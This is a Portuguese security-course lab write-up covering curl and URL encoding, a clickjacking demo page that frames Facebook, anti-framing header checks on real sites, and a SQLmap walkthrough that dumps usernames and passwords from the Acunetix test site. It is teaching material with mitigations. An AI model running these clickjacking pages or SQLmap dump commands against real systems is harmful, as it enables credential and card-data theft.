# 🧪 Laboratório – Módulo 06 | Aulas 3 e 4 – HTTP, Clickjacking e SQL Injection

---

## 📋 Visão Geral

| Atividade | Tema | Ambiente |
|-----------|------|----------|
| 6.6 | Requisições HTTP e Codificação Percentual com `curl` | Kali Linux |
| 6.7 | Encurtamento de links e geração de QR Code | Kali Linux |
| 6.8 | Ataque Clickjacking — demonstração prática | Kali Linux |
| 6.9 | Verificação de vulnerabilidade Clickjacking em sites reais | PC pessoal |
| 6.10 | SQL Injection com SQLmap em ambiente de teste | Kali Linux |

> ⚠️ **Aviso legal:** As atividades 6.8, 6.9 e 6.10 são realizadas exclusivamente em ambientes controlados e autorizados para fins educacionais. A utilização dessas técnicas em sistemas sem autorização é crime previsto na **Lei nº 12.737/2012 (Lei Carolina Dieckmann)** e no **Marco Civil da Internet**.

---

## 🔐 Conceitos Importantes para Segurança da Informação

### Codificação Percentual (Percent-Encoding / URL Encoding)
Mecanismo que substitui caracteres especiais em URLs por sequências `%XX` (ex.: `á` → `%C3%A1`, espaço → `%20`). Atacantes exploram variações de encoding para **bypassar filtros de WAF** e **ofuscar payloads maliciosos** em parâmetros de URL.

### `curl` e Requisições HTTP
Ferramenta de linha de comando para fazer requisições HTTP/HTTPS. Muito usada em pentests para testar APIs, enviar payloads e inspecionar headers de resposta — os mesmos headers que revelam (ou escondem) configurações de segurança do servidor.

### Clickjacking
Ataque de interface que sobrepõe um `<iframe>` transparente sobre um elemento visível, induzindo o usuário a clicar em algo que não vê. Mitigado pelo header HTTP `X-Frame-Options` e pela diretiva `frame-ancestors` da **Content Security Policy (CSP)**.

### SQL Injection
Injeção de código SQL malicioso em parâmetros de entrada de uma aplicação web. Permite ao atacante ler, modificar ou deletar dados do banco — incluindo senhas, cartões de crédito e informações pessoais. É consistentemente listado no **OWASP Top 10** como uma das vulnerabilidades mais críticas.

### SQLmap
Ferramenta open-source de automação de SQL Injection. Detecta o tipo de banco, enumera tabelas, colunas e extrai dados — tudo de forma automatizada. É referência tanto para pentesters quanto para equipes de defesa que precisam entender como ataques são conduzidos.

---

## 🌐 Atividade 6.6 – Requisições HTTP e Codificação Percentual

### Objetivo
Explorar o `curl` para fazer requisições HTTP, baixar arquivos e entender a codificação percentual em URLs.

### Passos

```bash
sudo -i

# Requisição simples — retorna HTML no terminal
curl https://www.example.com

# Download de página e salvamento em arquivo
cd /home/aluno/Documentos
curl -o output.html https://www.example.com
ls
# output.html
```

**Codificação percentual na prática** — pesquisar "Olá, mundo!" no Google via `curl`:

```bash
curl "https://www.google.com/search?q=Ol%C3%A1%2C%20mundo%21"
```

| Caractere | Encoded |
|-----------|---------|
| `á` | `%C3%A1` |
| `,` (vírgula especial) | `%2C` |
| ` ` (espaço) | `%20` |
| `!` | `%21` |

**Passo 6 – Testar no Firefox** 

Colar na barra de endereço:
```
https://www.google.com/search?q=Ol%C3%A1%2C%20mundo%21
```

```bash
# Limpeza
rm output.html
```

---

### 💡 Por que isso importa para Segurança da Informação?

Atacantes usam múltiplas camadas de encoding para **evadir WAFs** (Web Application Firewalls). Um payload `<script>` pode ser escrito como `%3Cscript%3E` ou mesmo em double-encoding (`%253Cscript%253E`). Entender encoding é essencial para analisar logs de servidor e identificar tentativas de ataque ofuscadas.

---

## 🔗 Atividade 6.7 – Encurtamento de Links e QR Code

### Objetivo
Encurtar uma URL via API do TinyURL e gerar um QR Code a partir do link encurtado.

### Passos

```bash
sudo -i

# Encurtar URL via API TinyURL
curl -s -i "https://tinyurl.com/api-create.php?url=https://esr.rnp.br/cursos/?_formacao_cursos=seguranca"
```

Saída esperada (trecho relevante):
```
HTTP/2 200
...
http://tinyurl.com/27ldrg4o
```

```bash
# Gerar QR Code a partir do link encurtado
cd /home/aluno/Documentos
qrencode -o qr_code.png "https://tinyurl.com/27ldrg4o"
ls
# qr_code.png
```

**Passo 5 – Visualizar o QR Code no Thunar** 

```bash
# Limpeza
rm qr_code.png
```

---

### 💡 Por que isso importa para Segurança da Informação?

Encurtadores de URL são amplamente usados em **phishing** — o link malicioso fica oculto atrás de um endereço curto e aparentemente inofensivo. QR Codes maliciosos (técnica chamada **QRLjacking**) são distribuídos em e-mails, impressos ou sobrepondo QR Codes legítimos em estabelecimentos. Ao escanear, a vítima é redirecionada para sites fraudulentos. Sempre verifique a URL final antes de clicar ou escanear.

---

## 🖱️ Atividade 6.8 – Ataque Clickjacking (Demonstração)

### Objetivo
Criar um arquivo HTML que demonstra o Clickjacking sobrepondo um `<iframe>` do Facebook sobre um botão falso.

**Credenciais:** `aluno` | senha: `rnpesr` | IP: `192.168.98.40`

### Como funciona o ataque

```
1. Vítima acessa página maliciosa atraída por link ("fique rico agora")
2. Página maliciosa tem um botão visível: "Click here!"
3. Sobre esse botão, há um <iframe> TRANSPARENTE com src do Facebook
4. Vítima clica no "botão" mas na verdade clica no iframe do Facebook
```

### Código HTML — `teste.html`

```html
<!doctype html>
<html>
<head>
  <meta charset="UTF-8">
</head>
<body>
  <style>
    iframe {
      width: 400px;
      height: 100px;
      position: absolute;
      top: 5px;
      left: -14px;
      opacity: 1;      /* visível = ataque não funciona */
      z-index: 1;
    }
  </style>

  <div>Click to get rich now:</div>
  <iframe src="https://www.facebook.com"></iframe>
  <button>Click here!</button>
  <div>...And you're cool (I'm a cool hacker actually)!</div>
</body>
</html>
```

### Testando variações de `opacity`

| `opacity` | Efeito visual | Comportamento do ataque |
|-----------|--------------|------------------------|
| `1` | iframe completamente visível (retângulo preto) | Ataque não funciona — usuário vê o iframe |
| `0.5` | iframe parcialmente visível | Parcialmente oculto, Firefox ainda bloqueia |
| `0.03` | iframe praticamente invisível | Quase imperceptível ao usuário |
| `0` | iframe completamente transparente | Ataque completo — clique vai para o iframe |

**Passo 9 – opacity: 0.03 com proteção do Firefox ativa** 

> O Firefox ESR 128 já conta com proteção contra Clickjacking. O iframe pode ser forçado via botão direito → "This Frame" → "Show Only This Frame".

```bash
# Limpeza
cd /home/aluno/Documentos && rm teste.html
```

---

### 💡 Por que isso importa para Segurança da Informação?

**Mitigações contra Clickjacking:**

```http
# Header HTTP que impede incorporação em iframes
X-Frame-Options: DENY          # nunca pode ser iframe
X-Frame-Options: SAMEORIGIN    # apenas mesmo domínio

# Alternativa moderna via CSP
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
```

Adicionar esses headers na configuração do servidor web (Nginx/Apache) é uma proteção simples e eficaz contra esse ataque.

---

## 🔍 Atividade 6.9 – Verificando Vulnerabilidade Clickjacking em Sites Reais

### Objetivo
Usar a ferramenta online **clickjacker.io** para testar se sites reais são vulneráveis ao Clickjacking.

> ⚠️ Esta atividade é realizada no **PC pessoal** (não na VM).

### Ferramenta utilizada
```
https://clickjacker.io/
```

### Resultados dos testes

**Site `esr.rnp.br` — Protegido ✅**
```
X-Frame-Options:         SAMEORIGIN
CSP Frame-Ancestors:     Missing anti-framing policy
```
> Protegido pelo `X-Frame-Options: SAMEORIGIN` — conteúdo só pode ser embedado pelo mesmo domínio.

---

**Site `www.hackthissite.org` — Vulnerável ❌** *(PRINT OBRIGATÓRIO)*
```
X-Frame-Options:         Missing header
CSP Frame-Ancestors:     Missing anti-framing policy
```
> Nenhum dos dois mecanismos de proteção está presente — vulnerável a Clickjacking.

### Interpretação dos campos

| Campo | Proteção presente | Proteção ausente |
|-------|------------------|-----------------|
| `X-Frame-Options` | `DENY` ou `SAMEORIGIN` | `Missing header` |
| `CSP frame-ancestors` | `'none'` ou `'self'` | `Missing anti-framing policy` |

---

## 💉 Atividade 6.10 – SQL Injection com SQLmap

### Objetivo
Usar o SQLmap para identificar vulnerabilidades de SQL Injection no site de teste `testphp.vulnweb.com` e extrair credenciais do banco de dados.

> ✅ **Ambiente autorizado:** `testphp.vulnweb.com` é um site de testes mantido pela Acunetix especificamente para fins de aprendizado em segurança.

**Credenciais:** `aluno` | senha: `rnpesr` | IP: `192.168.98.40`

### Alvo identificado

```
http://testphp.vulnweb.com/artists.php?artist=1
```
O parâmetro `artist=1` na URL é o vetor de injeção.

---

### Passo 1 – Enumerar bancos de dados

```bash
sudo -i
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
```

Vulnerabilidades encontradas pelo SQLmap:

| Técnica | Como funciona |
|---------|--------------|
| **Boolean-based Blind** | Infere dados pela diferença de resposta com condições `AND TRUE/FALSE` |
| **Time-based Blind** | Usa `SLEEP(5)` — se a resposta demora, a injeção funcionou |
| **UNION Query** | Combina resultado da query original com dados extraídos pelo atacante |

Bancos encontrados:
```
[*] acuart
[*] information_schema
```

---

### Passo 2 – Listar tabelas do banco `acuart`

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
```

```
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |   ← tabela crítica
+-----------+
```

---

### Passo 3 – Listar colunas de todas as tabelas

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --columns
```

**Tabela `users` — colunas críticas identificadas:**

| Coluna | Tipo | Risco |
|--------|------|-------|
| `uname` | varchar(100) | Nome de usuário |
| `pass` | varchar(100) | ⚠️ Senha (possivelmente em texto plano) |
| `cc` | varchar(100) | 🚨 Número de cartão de crédito |
| `email` | varchar(100) | Dado pessoal (LGPD) |
| `address` | mediumtext | Dado pessoal (LGPD) |

---

### Passo 4 – Extrair usuário

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
```

```
+-------+
| uname |
+-------+
| test  |
+-------+
```

---

### Passo 5 – Extrair senha

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump
```

```
+------+
| pass |
+------+
| test |
+------+
```

---

### Passo 6 – Login com credenciais obtidas

Acessar `http://testphp.vulnweb.com` → botão **Signup** → login com:
- **Usuário:** `test`
- **Senha:** `test`

---

### 💡 Por que isso importa para Segurança da Informação?

O SQL Injection explorado aqui é do tipo mais básico — e ainda assim expôs senhas e números de cartão de crédito. As principais defesas são:

| Defesa | Como implementar |
|--------|----------------|
| **Prepared Statements** | `SELECT * FROM users WHERE id = ?` — nunca concatenar input diretamente |
| **ORM** | Frameworks como Django, Hibernate abstraem queries e previnem SQLi |
| **WAF** | Web Application Firewall bloqueia payloads conhecidos |
| **Menor privilégio no banco** | Usuário da aplicação não deve ter `DROP` ou `SELECT` em tabelas sensíveis |
| **Senhas com hash** | Nunca armazenar senha em texto plano — usar `bcrypt`, `argon2` |

> 🔎 O campo `cc` (cartão de crédito) armazenado sem criptografia viola o **PCI DSS** (Payment Card Industry Data Security Standard), expondo a empresa a multas e processos judiciais em caso de vazamento.

---

## 🎓 Objetivos de Aprendizagem Alcançados

- ✅ Usou `curl` para requisições HTTP e entendeu codificação percentual em URLs
- ✅ Encurtou links via API e gerou QR Codes por linha de comando
- ✅ Demonstrou o funcionamento do Clickjacking manipulando `opacity` de `<iframe>`
- ✅ Testou headers de segurança (`X-Frame-Options`, `CSP`) em sites reais
- ✅ Executou SQL Injection automatizado com SQLmap em ambiente de teste autorizado
- ✅ Extraiu credenciais de banco de dados e entendeu as técnicas Boolean-blind, Time-blind e UNION
- ✅ Compreendeu as contramedidas para cada vulnerabilidade explorada

---
